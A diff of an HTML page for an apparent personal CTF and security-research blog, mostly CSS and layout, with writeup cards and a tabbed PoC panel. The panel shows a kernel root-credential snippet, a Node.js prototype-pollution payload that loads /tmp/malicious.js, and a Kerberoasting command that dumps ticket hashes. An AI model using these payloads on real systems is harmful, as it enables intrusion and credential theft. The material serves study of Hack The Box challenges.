@@ -3,113 +3,694 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>0xRoot // Core Command Matrix</title>
+  <title>0xRoot // Security Research & Writeups</title>
   
+  <!-- Premium Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="style.css">
+
+  <style>
+    /* --- Premium UI Core Tokens --- */
+    :root {
+      --bg-void: #03010a;
+      --bg-surface: #090514;
+      --bg-card: #110b24;
+      
+      --neon-purple: #a855f7;
+      --neon-purple-glow: rgba(168, 85, 247, 0.6);
+      --neon-beam-core: #e9d5ff;
+      --neon-cyan: #22d3ee;
+      --neon-green: #10b981;
+      
+      --text-main: #f3f4f6;
+      --text-muted: #9ca3af;
+      --text-dark: #4b5563;
+      
+      --border-purple: 1px solid rgba(168, 85, 247, 0.2);
+      --border-glow: 1px solid rgba(168, 85, 247, 0.4);
+      
+      --font-display: 'Space Grotesk', sans-serif;
+      --font-mono: 'Share Tech Mono', monospace;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      background-color: var(--bg-void);
+      color: var(--text-main);
+      font-family: var(--font-display);
+      overflow-x: hidden;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* --- The Master Grid & Beam Spotlight --- */
+    .hero-matrix {
+      position: relative;
+      padding: 120px 0 60px 0;
+      text-align: center;
+      background-image: 
+        linear-gradient(rgba(168, 85, 247, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(168, 85, 247, 0.03) 1px, transparent 1px);
+      background-size: 50px 50px;
+      background-position: center top;
+    }
+
+    /* The Cosmic Purple Glow Event Horizon */
+    .hero-matrix::after {
+      content: "";
+      position: absolute;
+      bottom: -150px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 140%;
+      height: 400px;
+      background: radial-gradient(ellipse at center, rgba(168, 85, 247, 0.22) 0%, rgba(168, 85, 247, 0.05) 45%, transparent 70%);
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    /* --- Cosmic Light Beam Component --- */
+    .neon-beam-source {
+      position: absolute;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 500px;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, var(--neon-purple), var(--neon-beam-core), var(--neon-purple), transparent);
+      box-shadow: 0 0 30px 10px var(--neon-purple-glow);
+      z-index: 5;
+    }
+
+    /* --- Navigation --- */
+    nav {
+      background: rgba(3, 1, 10, 0.75);
+      backdrop-filter: blur(20px);
+      border-bottom: var(--border-purple);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .nav-wrapper {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 72px;
+    }
+
+    .logo {
+      font-family: var(--font-mono);
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #fff;
+      text-decoration: none;
+      letter-spacing: -0.5px;
+    }
+
+    .logo span { color: var(--neon-purple); }
+
+    .nav-menu ul {
+      display: flex;
+      gap: 32px;
+      list-style: none;
+    }
+
+    .nav-menu a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.95rem;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+
+    .nav-menu a:hover, .nav-menu li.active a {
+      color: var(--neon-purple);
+    }
+
+    /* --- Typography & Branding Elements --- */
+    .sys-badge {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--neon-purple);
+      background: rgba(168, 85, 247, 0.08);
+      border: var(--border-purple);
+      padding: 6px 16px;
+      border-radius: 100px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .sys-badge::before {
+      content: "";
+      width: 6px;
+      height: 6px;
+      background: var(--neon-purple);
+      border-radius: 50%;
+      box-shadow: 0 0 8px var(--neon-purple);
+    }
+
+    h1 {
+      font-size: 4.5rem;
+      font-weight: 700;
+      letter-spacing: -2px;
+      margin-bottom: 16px;
+      line-height: 1.1;
+    }
+
+    h1 span {
+      background: linear-gradient(to bottom, #ffffff 40%, var(--neon-purple));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-desc {
+      font-size: 1.2rem;
+      color: var(--text-muted);
+      max-width: 580px;
+      margin: 0 auto 48px auto;
+      line-height: 1.6;
+    }
+
+    /* --- Live HTB Telemetry Card --- */
+    .htb-panel {
+      position: relative;
+      z-index: 10;
+      max-width: 750px;
+      margin: 0 auto;
+      background: rgba(17, 11, 36, 0.6);
+      border: var(--border-purple);
+      border-radius: 16px;
+      padding: 28px;
+      backdrop-filter: blur(12px);
+      display: grid;
+      grid-template-columns: auto 1fr;
+      gap: 32px;
+      text-align: left;
+      align-items: center;
+    }
+
+    .htb-panel:hover {
+      border: var(--border-glow);
+      box-shadow: 0 0 40px rgba(168, 85, 247, 0.15);
+    }
+
+    .htb-avatar {
+      background: var(--bg-void);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      padding: 20px 24px;
+      border-radius: 10px;
+      font-family: var(--font-mono);
+      text-align: center;
+    }
+
+    .htb-avatar .brand {
+      color: var(--neon-green);
+      font-size: 1.6rem;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .htb-stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+    }
+
+    .stat-unit {
+      background: rgba(3, 1, 10, 0.4);
+      border: var(--border-purple);
+      padding: 12px 16px;
+      border-radius: 8px;
+    }
+
+    .stat-unit label {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-dark);
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .stat-unit span {
+      font-size: 1.25rem;
+      font-weight: 700;
+    }
+
+    /* --- Bento Matrix Grid System --- */
+    .main-matrix {
+      padding: 100px 0;
+      position: relative;
+      z-index: 20;
+    }
+
+    .matrix-title {
+      font-size: 1.75rem;
+      margin-bottom: 32px;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .bento-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 20px;
+    }
+
+    .bento-box {
+      background: var(--bg-surface);
+      border: var(--border-purple);
+      border-radius: 14px;
+      padding: 28px;
+      text-decoration: none;
+      color: inherit;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      transition: transform 0.2s, border-color 0.2s;
+    }
+
+    .bento-box:hover {
+      border-color: var(--neon-purple);
+      transform: translateY(-2px);
+    }
+
+    .bento-box.wide {
+      grid-column: span 2;
+    }
+
+    .box-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .tag {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      padding: 4px 10px;
+      border-radius: 6px;
+      background: rgba(168, 85, 247, 0.1);
+      color: var(--neon-purple);
+    }
+
+    .box-title {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 10px;
+      line-height: 1.3;
+    }
+
+    .box-desc {
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .box-footer {
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      color: var(--text-dark);
+      border-top: 1px solid rgba(255,255,255,0.04);
+      padding-top: 14px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    /* --- Offensive Code Shell Poc Framework Subsystem --- */
+    .poc-container {
+      background: var(--bg-surface);
+      border: var(--border-purple);
+      border-radius: 14px;
+      padding: 24px;
+      margin-top: 40px;
+    }
+
+    .poc-nav {
+      display: flex;
+      gap: 12px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding-bottom: 16px;
+      margin-bottom: 20px;
+    }
+
+    .poc-btn {
+      background: rgba(255, 255, 255, 0.02);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      color: var(--text-muted);
+      padding: 8px 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      transition: all 0.2s;
+    }
+
+    .poc-btn:hover, .poc-btn.active {
+      background: rgba(168, 85, 247, 0.1);
+      border-color: var(--neon-purple);
+      color: #fff;
+    }
+
+    .poc-content {
+      display: none;
+    }
+
+    .poc-content.active {
+      display: block;
+    }
+
+    .code-grid {
+      display: grid;
+      grid-template-columns: 1fr 2fr;
+      gap: 24px;
+    }
+
+    .terminal-window {
+      background: #03010a;
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 8px;
+      padding: 16px;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      overflow-x: auto;
+      white-space: pre;
+    }
+
+    /* --- Bootstrap Template Transition Layers --- */
+    section {
+      display: none;
+    }
+
+    section.section-show {
+      display: block;
+      animation: fadeIn 0.4s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .page-header {
+      padding: 60px 0;
+      border-bottom: var(--border-purple);
+      margin-bottom: 40px;
+    }
+
+    .about-layout {
+      display: grid;
+      grid-template-columns: 1fr 2fr;
+      gap: 40px;
+      margin-top: 40px;
+    }
+
+    .about-sidebar {
+      background: var(--bg-surface);
+      border: var(--border-purple);
+      padding: 24px;
+      border-radius: 12px;
+      height: fit-content;
+    }
+
+    .terminal-string {
+      font-family: var(--font-mono);
+      color: var(--neon-cyan);
+      margin-bottom: 12px;
+    }
+
+    /* --- Footer --- */
+    footer {
+      border-top: var(--border-purple);
+      padding: 40px 0;
+      color: var(--text-dark);
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      display: flex;
+      justify-content: space-between;
+      margin-top: 60px;
+    }
+
+    @media (max-width: 900px) {
+      .bento-grid, .code-grid { grid-template-columns: repeat(2, 1fr); }
+      .bento-box.wide { grid-column: span 1; }
+      .htb-panel { grid-template-columns: 1fr; }
+      .about-layout { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 600px) {
+      .bento-grid, .code-grid { grid-template-columns: 1fr; }
+      h1 { font-size: 3rem; }
+    }
+  </style>
 </head>
 <body>
 
-  <nav>
+  <!-- App Header & Navigation Layer -->
+  <header id="header-nav">
     <div class="container nav-wrapper">
-      <a href="#" onclick="switchRoute('home'); return false;" class="logo">0xROOT<span>//</span></a>
-      <div class="nav-links">
-        <a href="#" onclick="switchRoute('home'); return false;" class="nav-target active">Home</a>
-        <a href="#" onclick="switchRoute('writeups'); return false;" class="nav-target">Target Writeups</a>
-        <a href="#" onclick="switchRoute('about'); return false;" class="nav-target">About</a>
+      <a href="#header" class="logo">0xROOT<span>//</span></a>
+      <nav class="nav-menu">
+        <ul>
+          <li class="active"><a href="#header">Home</a></li>
+          <li><a href="#writeups">Writeups</a></li>
+          <li><a href="#about">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <!-- SECTION 1: HOME VIEW -->
+  <section id="header" class="section-show">
+    <div class="hero-matrix">
+      <div class="container">
+        <div class="sys-badge">Operator Instance Live</div>
+        <h1>Hi, I'm <span>0xRoot</span></h1>
+        <p class="hero-desc">Independent security researcher documenting binary exploits, reverse engineering challenges, and exploit weaponization writeups.</p>
+        
+        <!-- Premium HTB Live Telemetry Box Component -->
+        <div class="htb-panel">
+          <div class="htb-avatar">
+            <div class="brand">HTB</div>
+            <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 4px;">RANKING_NODE</div>
+          </div>
+          <div>
+            <div style="font-family: var(--font-mono); font-size: 0.85rem; color: var(--neon-purple); margin-bottom: 8px;">LIVE CONNECTION ESTABLISHED</div>
+            <div class="htb-stats">
+              <div class="stat-unit"><label>Identity</label><span>0xRoot</span></div>
+              <div class="stat-unit"><label>Rank</label><span style="color:#a855f7;">Omniscient</span></div>
+              <div class="stat-unit"><label>System Owned</label><span>68</span></div>
+            </div>
+          </div>
+        </div>
       </div>
-    </div>
-  </nav>
-
-  <main id="view-home" class="app-view active-view container" style="padding-top: 40px;">
-    <div class="page-header">
-      <div class="sys-badge">Status: Operational</div>
-      <h2 style="font-size: 2.5rem; font-weight: 700;">Welcome to 0xRoot Hub</h2>
-    </div>
-    <p style="color: var(--text-muted); max-width: 600px; line-height: 1.6;">
-      Secured storage facility for vulnerability research documentation, multi-cloud structural indexing, and active offensive simulation field notes. Use the navigation vectors to cycle runtime frames.
-    </p>
-  </main>
-
-
-  <div id="view-writeups" class="app-view container" style="padding-top: 40px; display: none;">
-    <div class="page-header">
-      <div class="sys-badge">Target Manifest</div>
-      <h2 style="font-size: 2.5rem; font-weight: 700;">Offensive Operation Logs</h2>
+      <!-- Light Beam Aura Element -->
+      <div class="neon-beam-source"></div>
     </div>
 
-    <div class="bento-grid" style="margin-bottom: 40px;">
+    <main class="main-matrix">
+      <div class="container">
+        <h2 class="matrix-title">Recent Offensive Intelligence Ledger</h2>
+        <div class="bento-grid">
+          <!-- External Target Links shifting away dynamically using the query parameters -->
+          <a href="target-logs.html?machine=reactor" class="bento-box wide">
+            <div>
+              <div class="box-meta"><span class="tag">Weaponization Log</span><span style="color:red; font-size:0.85rem;">■ Insane</span></div>
+              <div class="box-title">Reactor: Prototype Pollution Vector</div>
+              <div class="box-desc">Exploiting untrusted key manipulation fields within Next.js runtime architectures to trigger underlying microservice code compilation injection blocks.</div>
+            </div>
+            <div class="box-footer"><span>OS // LINUX</span><span>EXPL_LOGS // EXECUTE ↗</span></div>
+          </a>
+          
+          <a href="target-logs.html?machine=appointment" class="bento-box">
+            <div>
+              <div class="box-meta"><span class="tag">SQLi Bypass</span><span style="color:var(--neon-green); font-size:0.85rem;">■ Easy</span></div>
+              <div class="box-title">Appointment Injection Bypass</div>
+              <div class="box-desc">Abusing raw database handling query logic fields via basic SQL termination syntax strings.</div>
+            </div>
+            <div class="box-footer"><span>OS // LINUX</span><span>EXPL_LOGS // EXECUTE ↗</span></div>
+          </a>
+        </div>
+
+        <!-- Offensive Weaponization Proof-of-Concept Dashboard Subsystem -->
+        <div class="poc-container">
+          <div class="terminal-string" style="color: var(--neon-purple)">// EXPLOIT_RELIABILITY_SANDBOX_INDEX</div>
+          <div class="poc-nav">
+            <button id="btn-poc-kernel" class="poc-btn active" onclick="openPocTab('poc-kernel')">Kernel Payloads</button>
+            <button id="btn-poc-web" class="poc-btn" onclick="openPocTab('poc-web')">Web RCE Chains</button>
+            <button id="btn-poc-ad" class="poc-btn" onclick="openPocTab('poc-ad')">Active Directory Vectors</button>
+          </div>
+
+          <!-- Kernel Content -->
+          <div id="poc-kernel" class="poc-content active">
+            <div class="code-grid">
+              <div style="font-family: var(--font-mono); border-right: 1px solid rgba(255,255,255,0.05); padding-right:15px;">
+                <div style="color:#fff; margin-bottom:8px;">Target Context:</div>
+                <div style="color:var(--neon-purple); font-weight:bold; margin-bottom:12px;">Linux PrivEsc LPE</div>
+                <div style="color:var(--text-dark); font-size:0.8rem;">Modifying cred structures in memory space via read/write primitives.</div>
+              </div>
+              <div class="terminal-window" style="color: var(--neon-cyan);">
+// Elevate permissions to root
+struct cred *new_creds = prepare_creds();
+if (new_creds) {
+    new_creds->uid.val = 0;
+    new_creds->gid.val = 0;
+    commit_creds(new_creds);
+}</div>
+            </div>
+          </div>
+
+          <!-- Web RCE Content -->
+          <div id="poc-web" class="poc-content">
+            <div class="code-grid">
+              <div style="font-family: var(--font-mono); border-right: 1px solid rgba(255,255,255,0.05); padding-right:15px;">
+                <div style="color:#fff; margin-bottom:8px;">Target Context:</div>
+                <div style="color:var(--neon-cyan); font-weight:bold; margin-bottom:12px;">NodeJS Pollution to RCE</div>
+                <div style="color:var(--text-dark); font-size:0.8rem;">Overriding object prototypes to hijack child processes executing shell commands.</div>
+              </div>
+              <div class="terminal-window" style="color: var(--neon-green);">
+// Poison child_process env strings
+ {
+   "__proto__": {
+     "env": { "NODE_OPTIONS": "--require /tmp/malicious.js" },
+     "shell": "/bin/sh"
+   }
+ }</div>
+            </div>
+          </div>
+
+          <!-- AD Vector Content -->
+          <div id="poc-ad" class="poc-content">
+            <div class="code-grid">
+              <div style="font-family: var(--font-mono); border-right: 1px solid rgba(255,255,255,0.05); padding-right:15px;">
+                <div style="color:#fff; margin-bottom:8px;">Target Context:</div>
+                <div style="color:var(--neon-green); font-weight:bold; margin-bottom:12px;">Kerberoasting Extraction</div>
+                <div style="color:var(--text-dark); font-size:0.8rem;">Requesting Service Tickets for accounts with SPNs to crack offline.</div>
+              </div>
+              <div class="terminal-window" style="color: #fff;">
+# Query Active Directory for TGS tickets
+Get-DomainUser -SPN | Get-DomainSPNTicket -InvokeKerberoast | 
+Select-Object -ExpandProperty Hash | Out-File -FilePath hashes.txt</div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </main>
+  </section>
+
+  <!-- SECTION 2: ALL WRITEUPS LEDGER -->
+  <section id="writeups">
+    <div class="container">
+      <div class="page-header">
+        <div class="sys-badge">Ledger Database</div>
+        <h2 style="font-size: 2.5rem; font-weight: 700;">All Target Profiles</h2>
+      </div>
       
-      <a href="target-logs.html?machine=reactor" class="bento-box" style="text-decoration: none;">
-        <div>
-          <div class="box-meta">
-            <span class="tag">Next.js RCE</span>
-            <span style="color: orange; font-size: 0.85rem;">■ Hard</span>
+      <div class="bento-grid" style="margin-bottom: 80px;">
+        <div class="bento-box">
+          <div>
+            <div class="box-meta"><span class="tag">Machine</span><span style="color:var(--neon-cyan); font-size:0.85rem;">■ Medium</span></div>
+            <div class="box-title">Analytics Engine Leak</div>
+            <div class="box-desc">Exposing pre-auth environment configurations via unvetted query parsing mechanics.</div>
           </div>
-          <h3 class="box-title">Reactor</h3>
-          <p class="box-desc">
-            Prototype pollution vector exploitation within unauthenticated React Server Component trees leading to automated shell drops.
-          </p>
+          <div class="box-footer"><span>OS // LINUX</span><span>BYPASS // RCE</span></div>
         </div>
-        <div class="box-footer">
-          <span>OS // LINUX</span>
-          <span>IP // 10.129.10.200</span>
-        </div>
-      </a>
 
-      <a href="target-logs.html?machine=appointment" class="bento-box" style="text-decoration: none;">
-        <div>
-          <div class="box-meta">
-            <span class="tag">SQL Injection</span>
-            <span style="color: #10b981; font-size: 0.85rem;">■ Very Easy</span>
+        <div class="bento-box">
+          <div>
+            <div class="box-meta"><span class="tag">Challenge</span><span style="color:orange; font-size:0.85rem;">■ Hard</span></div>
+            <div class="box-title">CryptoForge Matrix</div>
+            <div class="box-desc">Breaking down weak initialization vector re-use models across microservice validation endpoints.</div>
           </div>
-          <h3 class="box-title">Appointment</h3>
-          <p class="box-desc">
-            Authentication mechanism bypass via inline trailing inline database comment execution payloads.
-          </p>
+          <div class="box-footer"><span>CAT // CRYPTO</span><span>DATED // APR 2026</span></div>
         </div>
-        <div class="box-footer">
-          <span>OS // LINUX</span>
-          <span>IP // 10.129.17.133</span>
+
+        <div class="bento-box">
+          <div>
+            <div class="box-meta"><span class="tag">Machine</span><span style="color:red; font-size:0.85rem;">■ Insane</span></div>
+            <div class="box-title">ActiveDirectory SyncNode</div>
+            <div class="box-desc">Abusing local certificate allocation authorities to achieve forest-wide domain takeover.</div>
+          </div>
+          <div class="box-footer"><span>OS // WINDOWS</span><span>BYPASS // KERBEROS</span></div>
         </div>
-      </a>
-
-    </div>
-  </div>
-
-
-  <div id="view-about" class="app-view container" style="padding-top: 40px; display: none;">
-    <div class="page-header">
-      <div class="sys-badge">Operator Bio</div>
-      <h2 style="font-size: 2.5rem; font-weight: 700;">Security Researcher Profile</h2>
-    </div>
-    
-    <div class="about-layout" style="margin-top: 0;">
-      <div class="about-sidebar">
-        <div class="terminal-string">// RUNTIME_FOCUS</div>
-        <p style="color: var(--text-muted); font-size: 0.9rem; line-height: 1.6;">
-          • Cloud Security Governance<br>
-          • Prototype Pollution Mechanics<br>
-          • Identity & Access Infrastructure
-        </p>
-      </div>
-      <div>
-        <p style="color: var(--text-muted); line-height: 1.7; margin-bottom: 20px;">
-          Analytical sandbox engine tracking standard vulnerabilities, compliance mappings, and continuous exploit mechanics. This environment serves as a local reference node for academic audits and verification reviews.
-        </p>
       </div>
     </div>
-  </div>
+  </section>
 
+  <!-- SECTION 3: ABOUT INTERFACE -->
+  <section id="about">
+    <div class="container">
+      <div class="page-header">
+        <div class="sys-badge">System Operator Bio</div>
+        <h2 style="font-size: 2.5rem; font-weight: 700;">Core Directives</h2>
+      </div>
+      
+      <div class="about-layout" style="margin-bottom: 80px;">
+        <div class="about-sidebar">
+          <div class="terminal-string">> whoami</div>
+          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.6; margin-bottom: 16px;">
+            Security operator, developer, and computational enthusiast focusing on technical exploitation pipelines.
+          </p>
+          <div class="terminal-string">> tools_in_use</div>
+          <div style="font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-muted); line-height: 1.8;">
+            - GDB / Gef<br>
+            - Ghidra Decompiler<br>
+            - Rust Language Core<br>
+            - Python Exploitation Engines
+          </div>
+        </div>
+        
+        <div style="line-height: 1.7; color: var(--text-muted);">
+          <h3 style="color:#fff; margin-bottom:16px; font-size:1.4rem;">Operational Scope</h3>
+          <p style="margin-bottom: 16px;">My research targets low-level execution pipelines, secure kernel validation layers, and binary reverse engineering projects. This personal blog functions as a clean, decentralized repository of historical challenges cleared on global platforms like Hack The Box.</p>
+          <p>All materials are provided solely for academic study, secure development enhancement tracking, and threat profile hardening strategies.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-  <footer class="container" style="margin-top: 80px;">
+  <!-- System Footer -->
+  <footer class="container">
     <div>&copy; 2026 0xRoot Matrix Hub. All Rights Preserved.</div>
-    <div>STABLE // CORE_BUILD_v2</div>
+    <div>STABLE // BUILD_0x99A</div>
   </footer>
 
+  <!-- Native JavaScript Tab Handler (Keeps index completely independent) -->
+  <script>
+    function openPocTab(tabId) {
+      // Hide all tabs
+      document.querySelectorAll('.poc-content').forEach(content => {
+        content.classList.remove('active');
+      });
+      // Deactivate all buttons
+      document.querySelectorAll('.poc-btn').forEach(btn => {
+        btn.classList.remove('active');
+      });
+      // Show target tab and highlight its button
+      document.getElementById(tabId).classList.add('active');
+      document.getElementById('btn-' + tabId).classList.add('active');
+    }
+  </script>
+
+  <!-- Core JavaScript Libraries -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script src="main.js"></script>
 </body>
 </html>
